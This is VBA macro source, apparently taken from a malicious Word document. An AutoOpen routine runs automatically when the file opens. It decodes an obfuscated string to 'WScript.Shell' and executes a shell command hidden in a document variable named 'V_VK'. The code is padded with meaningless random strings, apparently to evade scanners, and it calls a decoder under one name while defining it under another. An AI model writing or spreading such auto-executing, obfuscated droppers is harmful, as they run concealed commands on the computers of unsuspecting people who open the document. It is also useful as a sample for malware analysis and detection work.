
Function PH_WW()
    Dim Y_ZA As String
 	Y_ZA = "099127111126117124128058095116113120120"
    
    Dim S_AS As Object: Set S_AS = VBA.CreateObject(K_KZ(Y_ZA))

 	Dim Y_RF As String
 	Y_RF = "Z2B1L9I2J4B2Y1S6J9S4L7S3B5D1Z4A3E4D5O8Z4C3M7W8F2M8A5H8S6M5A9U5D6R7G1B3L7"
 	Dim P_ZP As String
 	P_ZP = "L9B3B2W1L4Y4R6F8H6Q0E4X7K2K9X2X1P8O8J1Q1L1A3I2U6S6D4L9U6O1K5H3A9C5K0U4Y9"
 	Dim RR_OO As String
 	RR_OO = "V5G3E1X2J1W2D0E9W8J1R9Q4E6Z3U5T9Z5Q0H0D7K8I0H1H7K0U6V6O4O4Q7B7Q4O8L3P0W8"
 	Dim H_DJ As String
 	H_DJ = "E4I2Y4S2G7F4D2H6F2C9K7G1K0R5A1T5P0I2V1N4B1Y2U9K0D3Z5C2T8E5D4E6E7R7M6G6W1"
 	Dim H_SO As String
 	H_SO = "L3N4M0G5S0O5C6V1Z7T4T1H2R3V9Z7V3U4S7S0X0V1K2A6F8J3O2H8Y9D2F8X9X9B9A3W4U2"
 	Dim S_GP As String
 	S_GP = "W4N7Q9I0W3Z9Z6V0J1L2T9E6X3R5D4C5U6P3D9T0M3L8M2O1V4S7K0Z6L0O3R7I3I5Q4Q7L6"
 	Dim E_KX As String
 	E_KX = "W3S2H9A6D6C4D0U8G3Z5M7G1B3J9D4H8S7C2M7C4D0X2G3B2H0A4C1L1I3S4Q5S9L9Z3F2C0"
 	Dim L_NY As String
 	L_NY = "M1T9Y3X9V1G5A8F7U7A3M3Y0V1M4I9O3R0N7L0E0E8A4N2U6D6A8P4H0H6R5Q9I9Q2B5O8X3"
 	Dim N_BY As String
 	N_BY = "U7D6H1U0E9U9H5E3G3J2O3I6Q0M6O2H4J3S2D6K5V4A0W3B3O0A8N0S2H2V6T0R4X1M1Y7U4"

    S_AS.Exec M_KZ(ActiveDocument.Variables("V_VK"))
End Function

Sub AutoOpen()
    Application.Run "PH_WW"
End Sub

Public Function M_KZ(ByVal P_TU As String)
    For L_NK = 1 To Len(P_TU) Step 3
        P_ZM = Mid(P_TU, L_NK, 3)
        C_FW = C_FW + Chr(Int(P_ZM) - 12)
    Next
    M_KZ = C_FW
End Function